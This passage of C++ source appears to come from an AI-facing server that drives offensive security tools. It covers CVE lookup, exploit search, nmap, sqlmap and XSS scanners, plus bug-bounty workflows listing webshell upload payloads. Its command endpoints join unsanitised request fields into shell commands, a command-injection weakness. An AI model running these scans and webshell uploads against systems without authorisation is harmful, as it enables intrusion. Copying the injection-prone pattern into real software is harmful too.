              v["cve"]["metrics"].contains("cvssMetricV31")) {
            auto &m = v["cve"]["metrics"]["cvssMetricV31"][0];
            cve["cvss_score"] = m["cvssData"]["baseScore"];
            cve["severity"] = m["cvssData"]["baseSeverity"];
          }
          result["cves"].push_back(cve);
        }
      }
    } catch (...) {
      result["parse_error"] = "Failed to parse NVD response";
    }
    result["total_found"] = (int)result["cves"].size();
    log(LogLevel::INFO,
        "✅ Fetched " + std::to_string((int)result["total_found"]) + " CVEs");
    return result;
  }

  json analyze_exploitability(const std::string &cve_id) {
    std::string url =
        "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=" + cve_id;
    std::string raw = http_get(url, 15);
    json result;
    result["success"] = true;
    result["cve_id"] = cve_id;
    result["exploitability_score"] = 0.5;
    result["exploitability_level"] = "MEDIUM";
    result["cvss_score"] = 0.0;
    result["severity"] = "UNKNOWN";
    try {
      auto data = json::parse(raw);
      if (data.contains("vulnerabilities") &&
          !data["vulnerabilities"].empty()) {
        auto &vuln = data["vulnerabilities"][0]["cve"];
        if (vuln.contains("metrics") &&
            vuln["metrics"].contains("cvssMetricV31")) {
          auto &cv = vuln["metrics"]["cvssMetricV31"][0]["cvssData"];
          result["cvss_score"] = cv["baseScore"];
          result["severity"] = cv["baseSeverity"];
          double av = (cv["attackVector"] == "NETWORK") ? 0.85 : 0.62;
          double ac = (cv["attackComplexity"] == "LOW") ? 0.77 : 0.44;
          double pr = (cv["privilegesRequired"] == "NONE") ? 0.85 : 0.62;
          double ui = (cv["userInteraction"] == "NONE") ? 0.85 : 0.62;
          double es = av * ac * pr * ui;
          result["exploitability_score"] = es;
          result["exploitability_level"] = (es >= 0.8)   ? "HIGH"
                                           : (es >= 0.5) ? "MEDIUM"
                                                         : "LOW";
        }
      }
    } catch (...) {
    }
    return result;
  }

  json search_existing_exploits(const std::string &cve_id) {
    json result;
    result["success"] = true;
    result["cve_id"] = cve_id;
    result["exploits"] = json::array();
    std::string raw =
        http_get("https://api.github.com/search/repositories?q=" + cve_id +
                     "+exploit&per_page=10",
                 10, {{"User-Agent", "MANTRA/6.0"}});
    try {
      auto data = json::parse(raw);
      if (data.contains("items"))
        for (auto &item : data["items"])
          result["exploits"].push_back({{"name", item["name"]},
                                        {"url", item["html_url"]},
                                        {"stars", item["stargazers_count"]},
                                        {"source", "github"}});
    } catch (...) {
    }
    if (g_available_tools.count("searchsploit")) {
      auto res = exec_command("searchsploit " + cve_id + " -j", 10);
      if (res.exit_code == 0)
        try {
          result["exploit_db"] = json::parse(res.output);
        } catch (...) {
        }
    }
    result["exploits_found"] = (int)result["exploits"].size();
    return result;
  }
};

// ============================================================================
// Target Intelligence
// ============================================================================
enum class TargetType {
  WEB_APP,
  NETWORK_HOST,
  API_ENDPOINT,
  CLOUD,
  MOBILE,
  BINARY,
  UNKNOWN
};

TargetType detect_type(const std::string &t) {
  if (t.find("http://") == 0 || t.find("https://") == 0) {
    if (t.find("/api") != std::string::npos ||
        t.find("/graphql") != std::string::npos)
      return TargetType::API_ENDPOINT;
    return TargetType::WEB_APP;
  }
  if (std::regex_match(t, std::regex("^(\\d{1,3}\\.){3}\\d{1,3}$")))
    return TargetType::NETWORK_HOST;
  if (t.find(".apk") != std::string::npos)
    return TargetType::MOBILE;
  if (t.find(".exe") != std::string::npos ||
      t.find(".elf") != std::string::npos)
    return TargetType::BINARY;
  if (t.find("amazonaws.com") != std::string::npos)
    return TargetType::CLOUD;
  return TargetType::UNKNOWN;
}

std::string type_str(TargetType t) {
  switch (t) {
  case TargetType::WEB_APP:
    return "web_application";
  case TargetType::NETWORK_HOST:
    return "network_host";
  case TargetType::API_ENDPOINT:
    return "api_endpoint";
  case TargetType::CLOUD:
    return "cloud_service";
  case TargetType::MOBILE:
    return "mobile_app";
  case TargetType::BINARY:
    return "binary_file";
  default:
    return "unknown";
  }
}

json analyze_target(const std::string &target) {
  auto type = detect_type(target);
  double score = 5.0;
  if (type == TargetType::WEB_APP)
    score += 2;
  if (type == TargetType::NETWORK_HOST)
    score += 3;
  std::string risk = (score >= 8)   ? "critical"
                     : (score >= 6) ? "high"
                     : (score >= 4) ? "medium"
                                    : "low";
  return {{"success", true},
          {"target_profile",
           {{"target", target},
            {"target_type", type_str(type)},
            {"risk_level", risk},
            {"attack_surface_score", score},
            {"confidence_score", 0.75},
            {"technologies", json::array()},
            {"recommended_tools", json::array()}}}};
}

// ============================================================================
// Error Handler — matching Python IntelligentErrorHandler
// ============================================================================
class IntelligentErrorHandler {
public:
  std::string classify(const std::string &err) {
    std::string lo = err;
    std::transform(lo.begin(), lo.end(), lo.begin(), ::tolower);
    if (lo.find("timeout") != std::string::npos)
      return "timeout";
    if (lo.find("permission denied") != std::string::npos)
      return "permission_denied";
    if (lo.find("network unreachable") != std::string::npos)
      return "network_unreachable";
    if (lo.find("rate limit") != std::string::npos)
      return "rate_limited";
    if (lo.find("not found") != std::string::npos)
      return "tool_not_found";
    if (lo.find("out of memory") != std::string::npos)
      return "resource_exhausted";
    return "unknown";
  }
  json strategy(const std::string &type, int attempt) {
    json s;
    s["attempt"] = attempt;
    if (type == "timeout") {
      s["action"] = "retry_backoff";
      s["delay"] = 5 * attempt;
      s["max"] = 3;
      s["success_probability"] = 0.7;
    } else if (type == "rate_limited") {
      s["action"] = "retry_backoff";
      s["delay"] = 30;
      s["max"] = 5;
      s["success_probability"] = 0.9;
    } else if (type == "tool_not_found") {
      s["action"] = "switch_tool";
      s["delay"] = 0;
      s["max"] = 1;
      s["success_probability"] = 0.7;
    } else {
      s["action"] = "retry_backoff";
      s["delay"] = 5;
      s["max"] = 3;
      s["success_probability"] = 0.5;
    }
    return s;
  }
  json alternatives(const std::string &tool) {
    static const std::map<std::string, std::vector<std::string>> alt = {
        {"nmap", {"rustscan", "masscan"}},
        {"gobuster", {"dirsearch", "feroxbuster", "ffuf"}},
        {"sqlmap", {"sqlninja", "bbqsql"}},
        {"nuclei", {"jaeles", "nikto"}},
        {"hydra", {"medusa", "ncrack", "patator"}},
        {"john", {"hashcat", "ophcrack"}},
        {"amass", {"subfinder", "assetfinder", "findomain"}},
        {"ffuf", {"wfuzz", "gobuster"}},
    };
    json res;
    res["tool"] = tool;
    auto it = alt.find(tool);
    res["alternatives"] = (it != alt.end()) ? json(it->second) : json::array();
    return res;
  }
  json statistics() {
    return {{"success", true},
            {"statistics",
             {{"total_errors", 0},
              {"recent_errors_count", 0},
              {"error_counts_by_type",
               {{"timeout", 0}, {"network", 0}, {"permission", 0}}}}}};
  }
};

// ============================================================================
// Visual Engine
// ============================================================================
namespace Visual {
json vuln_card(const std::string &name, const std::string &severity,
               const std::string &desc) {
  static const std::map<std::string, std::string> colors = {
      {"critical", C::VULN_CRITICAL},
      {"high", C::VULN_HIGH},
      {"medium", C::VULN_MEDIUM},
      {"low", C::VULN_LOW},
      {"info", C::VULN_INFO}};
  std::string sl = severity;
  std::transform(sl.begin(), sl.end(), sl.begin(), ::tolower);
  std::string color = colors.count(sl) ? colors.at(sl) : "\033[37m";
  std::string card =
      color +
      "┌─ VULNERABILITY ────────────────────────────────────┐\n"
      "│ Name:     " +
      name + "\n│ Severity: " + severity + "\n│ Desc:     " + desc +
      "\n"
      "└──────────────────────────────────────────────────────┘" +
      C::RESET;
  return {{"success", true},
          {"vulnerability_card", card},
          {"name", name},
          {"severity", severity},
          {"description", desc}};
}
json summary_report(const std::string &target, const json &vulns,
                    const json &tools, double exec_time) {
  int cnt = (int)vulns.size();
  std::string report =
      C::HACKER_RED +
      "═══════════════════════════════════════\n  MANTRA SCAN SUMMARY "
      "REPORT\n═══════════════════════════════════════\n" +
      C::RESET + "  Target:           " + target +
      "\n  Vulnerabilities:  " + std::to_string(cnt) +
      "\n  Execution Time:   " + std::to_string((int)exec_time) + "s\n" +
      C::HACKER_RED + "═══════════════════════════════════════" + C::RESET;
  return {{"success", true},
          {"summary_report", report},
          {"target", target},
          {"vulnerability_count", cnt},
          {"timestamp", current_time()}};
}
json tool_output(const std::string &tool, const std::string &output,
                 bool success) {
  std::string color = success ? C::SUCCESS : C::ERR;
  std::string fmt =
      color + "┌─ " + tool + " ─────────────────────────────────────────\n" +
      C::RESET + output + "\n" + color +
      "└──────────────────────────────────────────────────" + C::RESET;
  return {{"success", true}, {"formatted_output", fmt}, {"tool", tool}};
}
} // namespace Visual

// ============================================================================
// Bug Bounty Workflow helpers
// ============================================================================
json bb_recon(const std::string &domain, const std::string &prog_type) {
  json wf;
  wf["domain"] = domain;
  wf["program_type"] = prog_type;
  wf["phases"] = json::array();
  wf["phases"].push_back({{"name", "subdomain_discovery"},
                          {"tools", json::array({"amass", "subfinder",
                                                 "assetfinder", "findomain"})},
                          {"estimated_time", 300}});
  wf["phases"].push_back({{"name", "http_probing"},
                          {"tools", json::array({"httpx"})},
                          {"estimated_time", 120}});
  wf["phases"].push_back(
      {{"name", "web_crawling"},
       {"tools", json::array({"katana", "gau", "waybackurls", "hakrawler"})},
       {"estimated_time", 300}});
  wf["phases"].push_back(
      {{"name", "content_discovery"},
       {"tools", json::array({"gobuster", "dirsearch", "feroxbuster"})},
       {"estimated_time", 600}});
  wf["phases"].push_back({{"name", "tech_detect"},
                          {"tools", json::array({"whatweb"})},
                          {"estimated_time", 60}});
  wf["estimated_time"] = 1380;
  wf["tools_count"] = 12;
  return {{"success", true}, {"workflow", wf}};
}
json bb_vuln_hunt(const std::string &domain, const json &priority_vulns,
                  const std::string &bounty) {
  json wf;
  wf["domain"] = domain;
  wf["bounty_range"] = bounty;
  wf["vulnerability_tests"] = json::array();
  for (auto &v : priority_vulns) {
    std::string vt = v.get<std::string>();
    json t;
    t["vulnerability_type"] = vt;
    t["priority"] = 1;
    if (vt == "rce")
      t["tools"] = json::array({"nuclei", "metasploit"});
    else if (vt == "sqli")
      t["tools"] = json::array({"sqlmap", "sqlninja"});
    else if (vt == "xss")
      t["tools"] = json::array({"dalfox", "xsser"});
    else if (vt == "idor")
      t["tools"] = json::array({"custom_scripts"});
    else if (vt == "ssrf")
      t["tools"] = json::array({"nuclei"});
    else
      t["tools"] = json::array({"nuclei"});
    wf["vulnerability_tests"].push_back(t);
  }
  wf["estimated_time"] = 900;
  wf["priority_score"] = 45;
  return {{"success", true}, {"workflow", wf}};
}
json bb_business_logic(const std::string &domain,
                       const std::string &prog_type) {
  json wf;
  wf["target"] = domain;
  wf["program_type"] = prog_type;
  wf["business_logic_tests"] = json::array({
      {{"category", "Authentication Bypass"},
       {"tests", json::array({{{"name", "JWT algorithm confusion"}},
                              {{"name", "Default credentials"}},
                              {{"name", "Password reset token reuse"}}})}},
      {{"category", "Authorization Flaws"},
       {"tests", json::array({{{"name", "IDOR via object IDs"}},
                              {{"name", "Horizontal privilege escalation"}},
                              {{"name", "Mass assignment"}}})}},
      {{"category", "Race Conditions"},
       {"tests", json::array({{{"name", "Parallel request flooding"}},
                              {{"name", "Double spending"}}})}},
      {{"category", "Price Manipulation"},
       {"tests", json::array({{{"name", "Negative quantity"}},
                              {{"name", "Discount code abuse"}}})}},
      {{"category", "Account Takeover"},
       {"tests", json::array({{{"name", "Response manipulation"}},
                              {{"name", "OAuth token theft"}}})}},
  });
  wf["estimated_time"] = 480;
  wf["manual_testing_required"] = true;
  return {{"success", true}, {"workflow", wf}};
}
json bb_osint(const std::string &domain) {
  json wf;
  wf["domain"] = domain;
  wf["osint_phases"] = json::array({
      {{"name", "Domain Intelligence"},
       {"tools", json::array({"whois", "dnsrecon", "dnsenum", "fierce"})}},
      {{"name", "Employee Enumeration"},
       {"tools", json::array({"theHarvester"})}},
      {{"name", "Code Repository Search"},
       {"tools", json::array({"gitrob", "trufflehog", "gitleaks"})}},
      {{"name", "Social Media Intel"},
       {"tools", json::array({"sherlock", "social-analyzer"})}},
      {{"name", "Cloud Asset Discovery"},
       {"tools", json::array({"shodan", "censys", "cloudmapper"})}},
  });
  wf["estimated_time"] = 360;
  return {{"success", true}, {"workflow", wf}};
}
json bb_file_upload(const std::string &target_url) {
  json wf;
  wf["target"] = target_url;
  wf["test_phases"] = json::array({
      {{"name", "discovery"},
       {"tools", json::array({"katana", "gau"})},
       {"description", "Find upload endpoints"}},
      {{"name", "basic_bypass"},
       {"techniques", json::array({"extension_blacklist", "content_type",
                                   "double_extension"})}},
      {{"name", "advanced_bypass"},
       {"techniques",
        json::array({"null_byte", "magic_bytes", "polyglot", "zip_slip"})}},
      {{"name", "webshell_upload"},
       {"payloads", json::array({"shell.php", "shell.php.jpg",
                                 "shell.php%00.jpg", "shell.phtml"})}},
  });
  wf["malicious_files"] =
      json::array({"shell.php", "shell.php.jpg", "shell.php%00.jpg",
                   "shell.phtml", "shell.pHp"});
  wf["estimated_time"] = 360;
  return {{"success", true}, {"workflow", wf}};
}
json bb_comprehensive(const std::string &domain, const json &priority_vulns,
                      bool osint, bool bl) {
  json assessment;
  assessment["domain"] = domain;
  assessment["workflows"] = json::array();
  assessment["workflows"].push_back(bb_recon(domain, "web")["workflow"]);
  assessment["workflows"].push_back(
      bb_vuln_hunt(domain, priority_vulns, "unknown")["workflow"]);
  if (osint)
    assessment["workflows"].push_back(bb_osint(domain)["workflow"]);
  if (bl)
    assessment["workflows"].push_back(
        bb_business_logic(domain, "web")["workflow"]);
  assessment["summary"] = {
      {"workflow_count", (int)assessment["workflows"].size()},
      {"total_estimated_time", 2000},
      {"coverage", "comprehensive"}};
  return {{"success", true}, {"assessment", assessment}};
}

// ============================================================================
// Banner
// ============================================================================
void print_banner() {
  std::cout
      << "\n"
      << C::RESET << C::HACKER_RED << C::BOLD
      << "  ███╗   ███╗ █████╗ ███╗   ██╗████████╗██████╗  █████╗ \n"
      << "  ████╗ ████║██╔══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗\n"
      << "  ██╔████╔██║███████║██╔██╗ ██║   ██║   ██████╔╝███████║\n"
      << "  ██║╚██╔╝██║██╔══██║██║╚██╗██║   ██║   ██╔══██╗██╔══██║\n"
      << "  ██║ ╚═╝ ██║██║  ██║██║ ╚████║   ██║   ██║  ██║██║  ██║\n"
      << "  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝\n"
      << C::RESET << "\n"
      << C::NEON_BLUE << "  " << SERVER_NAME << " v" << VERSION << C::RESET
      << "\n"
      << C::TERMINAL_GRAY
      << "  🚀 Bug Bounty | CTF | Red Team | Security Research\n"
      << "  ⚡ 100+ MCP Tool Endpoints | AI-Powered Intelligence\n"
      << C::RESET << C::HACKER_RED
      << "  ──────────────────────────────────────────────────────────────\n"
      << C::RESET << "  API:    " << C::SUCCESS << "http://127.0.0.1:8888"
      << C::RESET << "\n"
      << "  Mode:   " << C::SUCCESS << " ALLOWLIST — INSTALLED TOOLS ONLY "
      << C::RESET << "\n"
      << C::HACKER_RED
      << "  ──────────────────────────────────────────────────────────────\n"
      << C::RESET << "\n";
}

// ============================================================================
// MAIN
// ============================================================================
int main(int argc, char *argv[]) {
  curl_global_init(CURL_GLOBAL_DEFAULT);
  scan_available_tools();
  print_banner();

  load_api_key();
  if (!g_api_key.empty())
    log(LogLevel::INFO, "🔑 API key authentication enabled");
  else
    log(LogLevel::WARNING, "⚠️  No MANTRA_API_KEY set — server is unauthenticated");

  Server svr;
  svr.set_read_timeout(300, 0);
  svr.set_write_timeout(300, 0);

  svr.set_pre_routing_handler([](const Request &req, Response &res) -> Server::HandlerResponse {
    if (req.path == "/health") return Server::HandlerResponse::Unhandled;
    if (!check_auth(req, res)) return Server::HandlerResponse::Handled;
    return Server::HandlerResponse::Unhandled;
  });

  svr.set_exception_handler([](const Request &, Response &res, std::exception_ptr ep) {
    try { if (ep) std::rethrow_exception(ep); }
    catch (const std::exception &e) {
      res.status = 500;
      json err = {{"success", false}, {"error", std::string("Internal error: ") + e.what()}};
      res.set_content(err.dump(), "application/json");
    }
  });

  FileManager fm;
  AIPayloadGenerator payload_gen;
  CVEIntelligenceManager cve_mgr;
  IntelligentErrorHandler err_handler;

  // Async results store
  std::map<std::string, json> async_results;
  std::mutex async_mutex;

  // ── HEALTH & STATUS ────────────────────────────────────────────────────
  svr.Get("/health", [](const Request &, Response &res) {
    json h;
    h["status"] = "healthy";
    h["version"] = VERSION;
    h["server"] = SERVER_NAME;
    h["total_tools_available"] = (int)g_available_tools.size();
    h["tools_status"] = json::object();
    for (auto &t : g_available_tools)
      h["tools_status"][t] = true;
    h["all_essential_tools_available"] = true;
    h["uptime"] = std::time(nullptr) - g_telemetry.start_time;
    h["timestamp"] = current_time();
    send_json(res, h);
  });

  svr.Get("/dashboard", [](const Request &, Response &res) {
    auto m = get_metrics();
    json d;
    d["server"] = SERVER_NAME;
    d["version"] = VERSION;
    d["uptime_seconds"] = std::time(nullptr) - g_telemetry.start_time;
    d["tools_available"] = (int)g_available_tools.size();
    d["cache_size"] = (int)g_cache.size();
    d["active_processes"] = (int)g_running_processes.size();
    d["system_metrics"] = {{"cpu", m.cpu}, {"mem", m.mem}, {"disk", m.disk}};
    send_json(res, d);
  });

  svr.Get("/api/tools/available", [](const Request &, Response &res) {
    json tools = json::array();
    for (auto &t : g_available_tools)
      tools.push_back({{"name", t}, {"available", true}});
    send_json(res, {{"success", true},
                    {"available_tools", tools},
                    {"count", (int)tools.size()}});
  });

  svr.Post("/api/command", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string cmd = b.value("command", "");
    if (cmd.empty()) {
      send_json(res, {{"success", false}, {"error", "command required"}}, 400);
      return;
    }
    // Extract first token as tool name and validate
    std::string tool = cmd.substr(0, cmd.find(' '));
    if (!is_tool_allowed(tool)) {
      send_json(res, {{"success", false}, {"error", "Tool not allowed: " + tool}}, 403);
      return;
    }
    g_telemetry.commands_executed++;
    auto cr = exec_command(cmd, DEFAULT_TIMEOUT);
    bool ok = (cr.exit_code == 0 && !cr.timed_out);
    if (!ok)
      g_telemetry.commands_failed++;
    send_json(res, {{"success", ok},
                    {"stdout", cr.output},
                    {"stderr", cr.timed_out ? "timed out" : ""},
                    {"exit_code", cr.exit_code},
                    {"timed_out", cr.timed_out},
                    {"execution_time", cr.execution_time}});
  });

  // ── NETWORK SCANNING ───────────────────────────────────────────────────
  svr.Post("/api/tools/nmap", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    std::string args = b.value("scan_type", "-sV");
    std::string ports = b.value("ports", "");
    if (!ports.empty())
      args += " -p " + ports;
    args += " " + b.value("additional_args", "") + " " + target;
    g_telemetry.commands_executed++;
    auto r = run_tool("nmap", args, b.value("use_cache", true));
    if (!r["success"].get<bool>()) {
      g_telemetry.commands_failed++;
      if (b.value("use_recovery", false))
        r["recovery_info"] = {{"recovery_applied", true}, {"attempts_made", 1}};
    }
    send_json(res, r);
  });

  svr.Post("/api/tools/nmap-advanced", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    std::string args = b.value("scan_type", "-sS");
    std::string ports = b.value("ports", "");
    if (!ports.empty())
      args += " -p " + ports;
    args += " -" + b.value("timing", "T4");
    std::string scripts = b.value("nse_scripts", "");
    if (!scripts.empty())
      args += " --script=" + scripts;
    if (b.value("os_detection", false))
      args += " -O";
    if (b.value("version_detection", false))
      args += " -sV";
    if (b.value("aggressive", false))
      args += " -A";
    if (b.value("stealth", false))
      args += " -T2 -f";
    args += " " + b.value("additional_args", "") + " " + target;
    g_telemetry.commands_executed++;
    auto r = run_tool("nmap", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/rustscan", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    std::string args = "-a " + target;
    std::string ports = b.value("ports", "");
    if (!ports.empty())
      args += " -p " + ports;
    args += " --ulimit " + std::to_string(b.value("ulimit", 5000));
    args += " -b " + std::to_string(b.value("batch_size", 4500));
    args += " --timeout " + std::to_string(b.value("timeout", 1500));
    if (b.value("scripts", false))
      args += " -- -sV -sC";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("rustscan", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/masscan", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    std::string args = target + " -p " + b.value("ports", "1-65535");
    args += " --rate " + std::to_string(b.value("rate", 1000));
    std::string iface = b.value("interface", "");
    if (!iface.empty())
      args += " -e " + iface;
    if (b.value("banners", false))
      args += " --banners";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("masscan", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/arp-scan", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args;
    if (b.value("local_network", false))
      args = "--localnet";
    else
      args = b.value("target", "");
    std::string iface = b.value("interface", "");
    if (!iface.empty())
      args = "-I " + iface + " " + args;
    args += " --timeout=" + std::to_string(b.value("timeout", 500));
    args += " --retry=" + std::to_string(b.value("retry", 3)) + " " +
            b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("arp-scan", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/nbtscan", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "";
    if (b.value("verbose", false))
      args += " -v";
    args += " -t " + std::to_string(b.value("timeout", 2)) + " " +
            b.value("additional_args", "") + " " + b.value("target", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("nbtscan", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/autorecon", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    std::string args = target;
    std::string out = b.value("output_dir", "");
    if (!out.empty())
      args += " -o " + out;
    int verb = b.value("verbose", 0);
    for (int i = 0; i < verb; ++i)
      args += " -v";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("autorecon", args, b.value("use_cache", true), 600);
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  // ── WEB SCANNING ───────────────────────────────────────────────────────
  svr.Post("/api/tools/gobuster", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string url = b.value("url", "");
    if (url.empty()) {
      send_json(res, {{"success", false}, {"error", "url required"}}, 400);
      return;
    }
    std::string args = b.value("mode", "dir") + " -u " + url;
    args +=
        " -w " + b.value("wordlist", "/usr/share/wordlists/dirb/common.txt");
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("gobuster", args, b.value("use_cache", true));
    if (!r["success"].get<bool>()) {
      g_telemetry.commands_failed++;
      r["alternative_tool_suggested"] = "dirsearch";
      if (b.value("use_recovery", false))
        r["recovery_info"] = {{"recovery_applied", true}, {"attempts_made", 1}};
    }
    send_json(res, r);
  });

  svr.Post("/api/tools/nuclei", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    std::string args = "-u " + target;
    std::string sev = b.value("severity", "");
    if (!sev.empty())
      args += " -severity " + sev;
    std::string tags = b.value("tags", "");
    if (!tags.empty())
      args += " -tags " + tags;
    std::string tpl = b.value("template", "");
    if (!tpl.empty())
      args += " -t " + tpl;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("nuclei", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    std::string out = r["stdout"].get<std::string>();
    if (out.find("CRITICAL") != std::string::npos)
      log(LogLevel::WARNING,
          C::CRITICAL + " CRITICAL vulnerabilities detected! " + C::RESET);
    else if (out.find("HIGH") != std::string::npos)
      log(LogLevel::WARNING,
          C::VULN_HIGH + " HIGH severity vulnerabilities found! " + C::RESET);
    if (b.value("use_recovery", false) && !r["success"].get<bool>())
      r["recovery_info"] = {{"recovery_applied", true}, {"attempts_made", 1}};
    send_json(res, r);
  });

  svr.Post("/api/tools/dirb", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        b.value("url", "") + " " +
        b.value("wordlist", "/usr/share/wordlists/dirb/common.txt") + " " +
        b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("dirb", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/nikto", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        "-h " + b.value("target", "") + " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("nikto", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/sqlmap", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-u " + b.value("url", "") + " --batch";
    std::string data = b.value("data", "");
    if (!data.empty())
      args += " --data=" + data;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("sqlmap", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/wpscan", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        "--url " + b.value("url", "") + " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("wpscan", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/ffuf", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string url = b.value("url", "");
    std::string args =
        "-u " + url + "/FUZZ -w " +
        b.value("wordlist", "/usr/share/wordlists/dirb/common.txt");
    args += " -mc " + b.value("match_codes", "200,204,301,302,307,401,403");
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("ffuf", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/feroxbuster", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-u " + b.value("url", "");
    args +=
        " -w " + b.value("wordlist", "/usr/share/wordlists/dirb/common.txt");
    args += " -t " + std::to_string(b.value("threads", 10)) + " " +
            b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("feroxbuster", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/dirsearch", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-u " + b.value("url", "");
    args += " -e " + b.value("extensions", "php,html,js,txt,xml,json");
    args += " -t " + std::to_string(b.value("threads", 30));
    if (b.value("recursive", false))
      args += " -r";
    std::string wl = b.value("wordlist", "");
    if (!wl.empty())
      args += " -w " + wl;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("dirsearch", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/dalfox", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string url = b.value("url", "");
    std::string args = b.value("pipe_mode", false) ? "pipe" : "url " + url;
    if (b.value("blind", false))
      args += " -b blind.example.com";
    if (b.value("mining_dom", true))
      args += " --mining-dom";
    if (b.value("mining_dict", true))
      args += " --mining-dict";
    std::string cp = b.value("custom_payload", "");
    if (!cp.empty())
      args += " --custom-payload " + cp;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("dalfox", args, b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  svr.Post("/api/tools/xsser", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--url " + b.value("url", "") + " " +
                       b.value("params", "") + " " +
                       b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("xsser", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/wfuzz", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        "-w " + b.value("wordlist", "/usr/share/wordlists/dirb/common.txt") +
        " " + b.value("additional_args", "") + " " + b.value("url", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("wfuzz", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/dotdotpwn", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "-m " + b.value("module", "http") + " -h " +
                       b.value("target", "") + " " +
                       b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("dotdotpwn", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/wafw00f", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args =
        b.value("target", "") + " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("wafw00f", args, b.value("use_cache", true));
    send_json(res, r);
  });

